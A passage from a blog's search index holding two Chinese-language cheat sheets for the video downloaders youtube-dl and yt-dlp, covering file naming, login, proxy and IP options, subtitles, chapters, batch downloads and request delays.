<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl -f mp4 https://www.youtube.com/playlist?list=PL9K3xwFkFqWGEVTB3QNRQ1wgxF6Y-DMOX #方法一</span><br><span class="line">youtube-dl --format mp4 https://www.youtube.com/playlist?list=PL9K3xwFkFqWGEVTB3QNRQ1wgxF6Y-DMOX #方法二</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="輸出檔名"><a href="#輸出檔名" class="headerlink" title="輸出檔名"></a>輸出檔名</h1><p>我們預設下載的檔案名稱為影片的 <code>title</code>，如果要改變，我們需要使用以下的選項改變：</p>
<p><code>-o, --output</code> // 指定檔名輸出名稱</p>
<div class="note info flat">
    youtube-dl 預設下載的檔名格式為：<code>%(title)s-%(id)s.%(ext)s</code>。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl -o [change_name] [link]</span><br></pre></td></tr></table></figure>

<p><strong>例子:</strong></p>
<p>將輸出影片名稱名為 <code>Hi.mp4</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl -o &quot;Hi.mp4&quot; https://www.youtube.com/watch?v=rkVezCGQ22s</span><br></pre></td></tr></table></figure>

<h2 id="檔名-ID-去除"><a href="#檔名-ID-去除" class="headerlink" title="檔名 ID 去除"></a>檔名 ID 去除</h2><p>如果你只想要 <code>title</code> 的名稱，而又不想要 <code>ID</code> 的名稱你可以這樣做。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl -o &#x27;%(title)s.%(ext)s&#x27; [link]</span><br></pre></td></tr></table></figure>

<p><strong>例子:</strong></p>
<p>下載完成後檔案名稱為 <code>《食戟之靈 餐之皿》#11 (繁中字幕 _ 日語原聲)【Ani-One】-z6ptMZEj8pA.webm</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl -o &#x27;%(title)s.%(ext)s&#x27; https://www.youtube.com/watch?v=rkVezCGQ22s</span><br></pre></td></tr></table></figure>

<h2 id="檔名只有-ID"><a href="#檔名只有-ID" class="headerlink" title="檔名只有 ID"></a>檔名只有 ID</h2><p><code>--id</code> 個檔名得返 youtube 既 id。</p>
<p>下載完成後檔案名稱會是：<code>rkVezCGQ22s.webm</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl --id https://www.youtube.com/watch?v=rkVezCGQ22s</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="登入選擇"><a href="#登入選擇" class="headerlink" title="登入選擇"></a>登入選擇</h1><p>此方法為下載你的私人影片 (需要登入的影片)。</p>
<ul>
<li><code>-u, --username</code></li>
<li><code>-p, --password</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl -u [username] -p [password] [link]</span><br><span class="line">youtube-dl --username [username] --password [password] [link]</span><br></pre></td></tr></table></figure>

<p><strong>例子:</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl -u &#x27;username@gmail.com&#x27; -p &#x27;password&#x27; https://www.youtube.com/watch?v=rkVezCGQ22s</span><br><span class="line">youtube-dl --username &#x27;username@gmail.com&#x27; --password &#x27;password&#x27; https://www.youtube.com/watch?v=rkVezCGQ22s</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="網路指令"><a href="#網路指令" class="headerlink" title="網路指令"></a>網路指令</h1><p>以下指令可以更改你網路的位置或指定 <code>protocol</code>。</p>
<h2 id="更改-Proxy-下載"><a href="#更改-Proxy-下載" class="headerlink" title="更改 Proxy 下載"></a>更改 Proxy 下載</h2><p>使用指定的 Proxy 位置連線至網站再下載。</p>
<p>Proxy 位置可到這網站找 : <a href="https://vpnoverview.com/privacy/anonymous-browsing/free-proxy-servers/">https://vpnoverview.com/privacy/anonymous-browsing/free-proxy-servers/</a></p>
<div class="note warning flat">
    注意 : 通常也不需要使用這指令，因為速度不太理想，會用的情況通常是想突破地區限制的影片。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl --proxy [IP] [link]</span><br></pre></td></tr></table></figure>

<p><strong>例子:</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl --proxy 51.254.69.243 https://www.youtube.com/watch?v=rkVezCGQ22s</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="指定使用-IPV4-連線"><a href="#指定使用-IPV4-連線" class="headerlink" title="指定使用 IPV4 連線"></a>指定使用 IPV4 連線</h2><p>使用以下指令限制使用連線 <code>ipv4</code>。 </p>
<p><code>-4, --force-ipv4</code> // 將所有連線轉為 IPV4。</p>
<div class="note info flat">
    通常會用呢個指令係因為你下載緊個陣發現出左 <code>403 Error</code>。如果你輸入呢句指令就有機會解決問題，繼續下載你想下載既野。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl -4 [link]</span><br><span class="line">youtube-dl --force-ipv4 [link]</span><br></pre></td></tr></table></figure>

<p><strong>例子</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl -4 https://www.youtube.com/watch?v=rkVezCGQ22s</span><br><span class="line">youtube-dl --force-ipv4 https://www.youtube.com/watch?v=rkVezCGQ22s</span><br></pre></td></tr></table></figure>


<h2 id="指定使用-IPV6-連線"><a href="#指定使用-IPV6-連線" class="headerlink" title="指定使用 IPV6 連線"></a>指定使用 IPV6 連線</h2><p>使用以下指令限制使用連線 <code>ipv6</code>。 </p>
<p><code>-6, --force-ipv6</code> // 將所有連線轉為 IPV6。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl -6 [link]</span><br><span class="line">youtube-dl --force-ipv6 [link]</span><br></pre></td></tr></table></figure>

<p><strong>例子</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl -6 https://www.youtube.com/watch?v=rkVezCGQ22s</span><br><span class="line">youtube-dl --force-ipv6 https://www.youtube.com/watch?v=rkVezCGQ22s</span><br></pre></td></tr></table></figure>

<h2 id="使用其他-IP-連線"><a href="#使用其他-IP-連線" class="headerlink" title="使用其他 IP 連線"></a>使用其他 IP 連線</h2><p><code>--source-address [IP]</code> 將所有連線改變至這 IP 位置。</p>
<div class="note info flat">
    你唔想用自己 data 咪用人地啲 data (?)
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl --source-address [IP]</span><br></pre></td></tr></table></figure>

<p><strong>例子</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl --source-address 123.123.123.123</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="文章更新"><a href="#文章更新" class="headerlink" title="文章更新"></a>文章更新</h1><p>以上就是我覺得很實用的指令，本文篇會不定期更新，更新日期為：</p>
<ul>
<li>2022-06-19 (改至更詳細)</li>
<li>2022-06-30 (修改內文至更易明白)</li>
</ul>
]]></content>
      <categories>
        <category>youtube-dl</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>Cheat Sheet</tag>
      </tags>
  </entry>
  <entry>
    <title>yt-dlp - 下載影片或音樂</title>
    <url>/2022/05/28/yt-dlp-commands/</url>
    <content><![CDATA[<img alt="yt-dlp" src="cover.svg" width="auto"/>

<h1 id="Youtube-dl"><a href="#Youtube-dl" class="headerlink" title="Youtube-dl "></a>Youtube-dl <i class="fa-brands fa-youtube"></i></h1><p>yt-dlp 係一個 youtube-dl 既加強版本，基本上所有功能都比起原本既 youtube-dl 好好多，例如喺下載速度方面，因為 youtube-dl 係用單線程，而 yt-dlp 呢邊就係用緊多線程下載，所以速度方面係快好撚多。<br>另外，喺更新速度方面，佢比起 youtube-dl 本身既快好多倍。指令方面會比起 youtube-dl 本身仲多左。</p>
<p><img src="--help.png"></p>
<h2 id="第三方程式"><a href="#第三方程式" class="headerlink" title="第三方程式 "></a>第三方程式 <i class="fa-brands fa-youtube"></i></h2><p>因應 youtube-dl 係開源 github 作品，所以出現左好多唔同版本由社群創造既版本，以下係三個作品既分別資訊</p>
<table>
<thead>
<tr>
<th>版本</th>
<th>更新速度</th>
<th>連接方法</th>
<th>支援系統</th>
<th>指令分別</th>
<th>介面</th>
</tr>
</thead>
<tbody><tr>
<td><a href="https://github.com/ytdl-org/youtube-dl">Youtube-dl</a></td>
<td>超慢</td>
<td>單線程</td>
<td>Linux, Mac, Windows</td>
<td>唔夠 yt-dlp 多指令</td>
<td>指令操作，白色字顯示</td>
</tr>
<tr>
<td><a href="https://github.com/yt-dlp/yt-dlp">yt-dlp</a></td>
<td>頻繁</td>
<td>多線程</td>
<td>Linux, Mac, Windows</td>
<td>比起 youtube-dl 多指令</td>
<td>指令操作，顏色字顯示</td>
</tr>
<tr>
<td><a href="https://github.com/jely2002/youtube-dl-gui">youtube-dl-gui</a></td>
<td>似乎已停更</td>
<td>Unknown</td>
<td>Mac, Windows</td>
<td>圖形用戶介面</td>
<td>圖形用戶介面</td>
</tr>
</tbody></table>
<hr>
<h1 id="多線程下載影片"><a href="#多線程下載影片" class="headerlink" title="多線程下載影片"></a>多線程下載影片</h1><p>其實呢個指令係唔洗打都得，因為佢預設係已經會用多線程下載，不過你想指定既數字咁下載就用啦 ~~</p>
<p><code>--concurrent-fragments [number]</code> 使用你想要的線程下載影片。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yt-dlp [link] --concurrent-fragments (number)</span><br></pre></td></tr></table></figure>

<p><strong>例子 :</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yt-dlp --concurrent-fragments 10 https://www.youtube.com/watch?v=d59Qe_Ov2k8</span><br></pre></td></tr></table></figure>

<p><img src="--concurrent-fragments.gif"></p>
<hr>
<h1 id="改變下載速度"><a href="#改變下載速度" class="headerlink" title="改變下載速度"></a>改變下載速度</h1><p>下載片既時候係會用左你既頻寛 (流量)，呢個時候就會將你部機既上網變慢左，<br>咁有可能會造成你上網既體驗變差左，呢個時候就可以用呢個指令去指定你想要既速度。</p>
<p><code>--throttled-rate [number]K</code> 限制使用你想要的速度下載影片。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yt-dlp [link] --throttled-rate [number]K</span><br></pre></td></tr></table></figure>

<p><strong>例子 :</strong></p>
<p>限制使用 100K 下載影片。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yt-dlp --throttled-rate 100K https://www.youtube.com/watch?v=d59Qe_Ov2k8</span><br></pre></td></tr></table></figure>

<p><img src="--throttled-rate.gif"></p>
<hr>
<h1 id="Chapters-選項"><a href="#Chapters-選項" class="headerlink" title="Chapters 選項"></a>Chapters 選項</h1><p>如影片內有像 DVD 的分段影片 (章節)，此功能可以將影片加入 meta 數據和分開不同多個影片檔案。</p>
<p><img src="chapters.png"></p>
<h2 id="分段下載章節"><a href="#分段下載章節" class="headerlink" title="分段下載章節"></a>分段下載章節</h2><p>分開不同多個影片檔案，意思是例如將一條有 10 個章節的影片，將他切為 10 條影片。</p>
<p>我們會使用此指令：<code>--split-chapters</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yt-dlp --split-chapters [link]</span><br></pre></td></tr></table></figure>

<p><strong>例子 :</strong></p>
<p>分段下載 <code>輝夜姬想讓人告白～天才們的戀愛頭腦戰～</code> OST SoundTrack :3</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yt-dlp --split-chapters https://www.youtube.com/watch?v=7STIvp__eh8</span><br></pre></td></tr></table></figure>

<p><img src="--split-chapters.gif"></p>
<h2 id="影片內加入時間軌"><a href="#影片內加入時間軌" class="headerlink" title="影片內加入時間軌"></a>影片內加入時間軌</h2><p>此功能會有可能需要使用第三方的 Player 才能看到，例如使用 <code>VLC Player</code>, <code>Pot Player</code>, <code>MPV</code>。</p>
<p>我們會使用此指令：<code>--embed-chapters</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yt-dlp --embed-chapters [link]</span><br></pre></td></tr></table></figure>

<p><strong>例子 :</strong><br>加入時間軌下載 <code>輝夜姬想讓人告白～天才們的戀愛頭腦戰～</code> OST SoundTrack :3</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yt-dlp --embed-chapters https://www.youtube.com/watch?v=7STIvp__eh8</span><br></pre></td></tr></table></figure>

<p><img src="--embed-chapters.png"></p>
<hr>
<h1 id="字幕選項-主要為自動生產"><a href="#字幕選項-主要為自動生產" class="headerlink" title="字幕選項 (主要為自動生產)"></a>字幕選項 (主要為自動生產)</h1><p>此選項為下載影片內有的字幕檔案 (自動生產)。</p>
<h2 id="列出存在的字幕語言"><a href="#列出存在的字幕語言" class="headerlink" title="列出存在的字幕語言"></a><strong><span style="font-size:larger;">列出存在的字幕語言</span></strong></h2><p>此方法為列出影片內存在的字幕名稱。</p>
<div class="note info flat">
    這邊和 <code>youtube-dl</code> 不一樣，<code>yt-dlp</code> 會列出自動生產的字幕，而 <code>youtube-dl</code> 就不會列出自動生產的字幕。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yt-dlp --list-subs [link]</span><br></pre></td></tr></table></figure>

<p><strong>例子 :</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yt-dlp --list-sub https://www.youtube.com/watch?v=GQES5SsNWZA</span><br></pre></td></tr></table></figure>

<p><img src="--list-sub.gif"></p>
<h2 id="下載字幕並插入影片內-字幕為自動生產的日文和英文"><a href="#下載字幕並插入影片內-字幕為自動生產的日文和英文" class="headerlink" title="下載字幕並插入影片內 (字幕為自動生產的日文和英文)"></a><strong><span style="font-size:larger;">下載字幕並插入影片內 (字幕為自動生產的日文和英文)</span></strong></h2><p>此示範會下載多個自動生產的字幕檔並插入影片內。</p>
<div class="note warning flat">
    注意：你應該先使用 <code>--list-sub</code> 檢查正確的代號是什麼才繼續，什麼意思呢？ 例如正常英文字幕名稱為：<code>en</code> 但在自動生產的英文字幕名稱不是命名為 <code>en</code>，而是會命名為其他名稱。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yt-dlp --write-auto-sub --embed-sub --sub-lang [subtitle_one_name],[subtitle_two_name] [link]</span><br></pre></td></tr></table></figure>

<p><strong>例子 :</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yt-dlp --write-auto-sub --embed-sub --sub-lang en-en,zh-Hant-ja https://www.youtube.com/watch?v=50vbSrIdcD0</span><br></pre></td></tr></table></figure>

<p><img src="en-ja-subtitle.gif"></p>
<h2 id="下載所有語言的字幕並插入影片內-包括自動生產"><a href="#下載所有語言的字幕並插入影片內-包括自動生產" class="headerlink" title="下載所有語言的字幕並插入影片內 (包括自動生產)"></a><strong><span style="font-size:larger;">下載所有語言的字幕並插入影片內 (包括自動生產)</span></strong></h2><p>此方法適用於 youtube 網站，如果影片內有自動生產的字幕選項，使用這個指令就能下載自動生產的字幕檔並插入在影片內並生字外掛字幕。</p>
<div class="note warning flat">
    注意：因為自動生產的字幕會過多，為了避免出現 429 Error too many requests 和 HTTP Not Found 404，需要使用兩個指令：<code>--sleep-subtitles</code>, <code>--force-ipv4</code>
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yt-dlp --write-auto-sub --embed-sub --all-subs --force-ipv4 --sleep-interval [secound number] [link]</span><br></pre></td></tr></table></figure>

<p><strong>例子 :</strong></p>
<p>示範下載所有自動生產的字幕，強制使用 ipv4 連線，每次下載字幕會延遲 5 秒。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yt-dlp --write-auto-sub --embed-sub --all-subs --force-ipv4 --sleep-subtitles 5 https://www.youtube.com/watch?v=50vbSrIdcD0</span><br></pre></td></tr></table></figure>

<p><img src="-4sleepsubtitle.gif"></p>
<hr>
<h1 id="讀取文字檔連結"><a href="#讀取文字檔連結" class="headerlink" title="讀取文字檔連結"></a>讀取文字檔連結</h1><p>有時候你想將成個 Bookmarks 既 youtube 片下載，但係又唔想慢慢打 link 既時候，<br>你就可以起個 txt 檔案，然後再將 d link 擺入去 (每一行一條 link)。</p>
<p>要用呢個方法下載所有連結，我地只需要使用 <code>-a</code> 選項，以下示範 ~~</p>
<h2 id="第一步-建立文字檔"><a href="#第一步-建立文字檔" class="headerlink" title="第一步 (建立文字檔)"></a>第一步 (建立文字檔)</h2><p>起個 <code>txt 檔</code>，將個 file 名改做你想改既名 (我用 <code>link.txt</code> 做示範)，入面既內容就咁樣打 :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.youtube.com/watch?v=gKn3xeli7vs</span><br><span class="line">https://www.youtube.com/watch?v=DF3VumNX474</span><br><span class="line">https://www.youtube.com/watch?v=2qUc2YZJWdM</span><br></pre></td></tr></table></figure>

<h2 id="第二步-下載"><a href="#第二步-下載" class="headerlink" title="第二步 (下載)"></a>第二步 (下載)</h2><p>使用 <code>-a</code> 指令讀取 <code>link.txt</code> 內的連結並進行下載。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yt-dlp -a link.txt</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="延遲下載"><a href="#延遲下載" class="headerlink" title="延遲下載"></a>延遲下載</h1><p>有時候因為檔案太小，像是下載 srt vtt 這些檔案，然後出現錯誤 429，說太多發送要求，此時只需使用這個參數將下載延遲就好：</p>
<p><code>--sleep-interval</code> [secound number]：延遲所有下載延遲<br><code>--sleep-subtitles</code> [secound nummber]：延遲下載字幕的時候</p>
<h2 id="所有下載延遲"><a href="#所有下載延遲" class="headerlink" title="所有下載延遲"></a>所有下載延遲</h2><p>何謂是所有延遲？ 意思是所有進行中的下載會在前一次要求都會延遲你的指定秒數，例如音樂，影片，json，metadata，字幕檔案。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yt-dlp --sleep-interval [secound number] [link]</span><br></pre></td></tr></table></figure>

<p><strong>示範：</strong></p>
<p>示範延遲 5 秒下載影片。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yt-dlp --sleep-interval 5 https://www.youtube.com/watch?v=58cj6qIWptU</span><br></pre></td></tr></table></figure>

<p><img src="--sleep-interval.gif"></p>
<h2 id="延遲下載字幕"><a href="#延遲下載字幕" class="headerlink" title="延遲下載字幕"></a>延遲下載字幕</h2><p>這個參數是只有下載字幕的時候會有延遲。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yt-dlp --write-sub --embed-sub --all-subs --skip-download --sleep-subtitles [second number] [link]</span><br></pre></td></tr></table></figure>

<p><strong>示範：</strong></p>
<p>示範延遲 5 秒下載字幕。(不是自動生產的字幕)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yt-dlp --write-sub --embed-sub --all-subs --skip-download --sleep-subtitles 5 https://www.youtube.com/watch?v=mH0_XpSHkZo</span><br></pre></td></tr></table></figure>

<p><img src="--skipdownload-srt-delay.gif"></p>
<h1 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h1><p><a href="https://unix.stackexchange.com/questions/685998/how-to-list-chapter-titles-from-a-youtube-video-using-youtube-dl">https://unix.stackexchange.com/questions/685998/how-to-list-chapter-titles-from-a-youtube-video-using-youtube-dl</a><br><a href="https://www.reddit.com/r/youtubedl/comments/txxzdr/how_do_i_download_videos_with_chapterstimestamps/">https://www.reddit.com/r/youtubedl/comments/txxzdr/how_do_i_download_videos_with_chapterstimestamps/</a><br><a href="https://github.com/blackjack4494/yt-dlc/issues/158">https://github.com/blackjack4494/yt-dlc/issues/158</a><br><a href="https://stackoverflow.com/questions/57488759/npmyoutube-dl-and-lamda-http-error-429-too-many-requests/62213935#62213935">https://stackoverflow.com/questions/57488759/npmyoutube-dl-and-lamda-http-error-429-too-many-requests/62213935#62213935</a></p>
]]></content>
      <categories>
        <category>youtube-dl</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>Cheat Sheet</tag>
      </tags>
  </entry>
</search>
